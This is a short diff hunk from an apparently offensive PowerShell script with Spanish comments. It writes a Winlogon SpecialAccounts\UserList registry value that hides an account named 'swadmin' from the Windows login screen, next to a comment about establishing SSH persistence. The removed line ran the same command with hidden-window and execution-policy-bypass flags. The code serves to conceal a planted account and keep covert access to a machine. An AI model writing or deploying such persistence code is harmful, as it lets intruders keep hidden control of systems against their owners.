@@ -49,7 +49,7 @@ cd $path
 #powershell .\"$reg_file.reg";powershell .\"$vbs_file.vbs"
 
 #Creacion de registro
-powershell -windowstyle hidden -ep bypass Set-Location -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\';Get-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' | New-Item -Name 'SpecialAccounts\UserList' -Force;New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Name 'swadmin' -Value 00000000 -PropertyType DWord -Force
+powershell Set-Location -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\';powershell Get-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' | New-Item -Name 'SpecialAccounts\UserList' -Force;powershell New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Name 'swadmin' -Value 00000000 -PropertyType DWord -Force
 cd $path
 
 #Estableciendo persistencia ssh
